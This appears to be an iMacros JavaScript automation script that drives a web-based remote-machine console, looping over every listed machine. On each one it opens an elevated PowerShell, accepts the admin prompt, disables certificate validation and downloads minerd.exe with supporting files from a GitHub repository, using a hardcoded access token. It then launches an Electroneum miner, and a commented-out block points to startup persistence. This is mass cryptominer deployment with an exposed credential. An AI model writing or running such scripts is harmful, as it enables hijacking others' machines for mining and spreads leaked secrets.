var pref = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService);

function loadScriptFromURL(url) {
    var request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest),
        async = false;
    request.open('GET', url, async);
    request.send();
    if (request.status !== 200) {
        var message = 'an error occurred while loading script at url: ' + url + ', status: ' + request.status;
        display_timeline(message);
        return false;
    }
    eval(request.response);
    return true;
}
function load_jquery(){
	loadScriptFromURL('https://code.jquery.com/jquery-1.12.4.min.js');
	$ = window.$;
	JQuery = window.JQuery;
}
load_jquery();
	var total_machine = $('#machines .machine').length ; 
	for(j = 1 ; j < total_machine ; j++){
	
		iimPlay("CODE:TAG POS="+j+" TYPE=DIV ATTR=CLASS:machineName");
		iimPlay("CODE:WAIT SECONDS = 5");
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=cmd ");
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		// cd C:/
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="powershell -NoExit -Command \'Set-Location C: \' "');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="Start-Process powershell -Verb runAs"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 4");
		
		//allow admin permisson
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:37');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 3");
		
		
		// downoad File
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; $client = new-object System.Net.WebClient ;"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 5");
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="$client.Headers.Add(\\"Authorization\\",\\"token 8d795936d2c1b2806587719b9b6456bd16549ad8\\");$client.Headers.Add(\\"Accept\\",\\"application/vnd.github.v3.raw\\");" ');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 5");
		
		var myStringArray = ["etn_startup.exe","libcurl.dll" , "libeay32.dll" , "libgcc_s_seh-1.dll" ];
		var arrayLength = myStringArray.length;
		var longstring = '';
		for (var i = 0; i < arrayLength; i++) {
			
		//	longstring = longstring + '$client.DownloadFile(\"http://thuenhahn.com/temp/'+myStringArray[i]+'\",\\"C:\\'+myStringArray[i]+'\\");';
			longstring = longstring + '$client.DownloadFile(\"https://github.com/pikemonlonton/etn/raw/master/'+myStringArray[i]+'\",\\"C:\\'+myStringArray[i]+'\\");';
		}
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="'+longstring+'"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		var longstring = '';
		iimPlay("CODE:WAIT SECONDS = 14");
		var myStringArray = ["libstdc++-6.dll" , "libwinpthread-1.dll" , "minerd.exe" , "ssleay32.dll" , "star-etn.bat" ,"star-etnFromC.bat" , "zlib1.dll"];
		var arrayLength = myStringArray.length;
		var longstring = '';
		for (var i = 0; i < arrayLength; i++) {
			
		//	longstring = longstring + '$client.DownloadFile(\"http://thuenhahn.com/temp/'+myStringArray[i]+'\",\\"C:\\'+myStringArray[i]+'\\");';
			longstring = longstring + '$client.DownloadFile(\"https://github.com/pikemonlonton/etn/raw/master/'+myStringArray[i]+'\",\\"C:\\'+myStringArray[i]+'\\");';
		}
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="'+longstring+'"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 14");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 18");
		
		// open cmd
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=cmd ");
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		// cd C:/
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="cd C://"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		// runmine
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="etn_startup"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");
	/*	
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="exit()"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=shell:startup ");
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		*/
	}	
	






